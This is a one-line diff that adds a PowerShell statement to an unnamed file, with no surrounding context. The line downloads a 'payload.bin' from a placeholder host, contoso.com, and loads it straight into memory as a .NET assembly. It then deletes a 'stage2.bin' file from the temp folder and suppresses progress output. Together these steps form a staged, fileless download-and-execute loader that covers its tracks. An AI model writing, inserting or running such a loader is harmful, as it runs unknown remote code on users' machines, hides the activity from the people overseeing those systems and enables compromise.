@@ -1,0 +1,1 @@
+try { $PayloadBytes = (New-Object System.Net.WebClient).DownloadData("http://contoso.com/payload.bin"); [Reflection.Assembly]::Load($PayloadBytes); Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Stage transfer failed" }
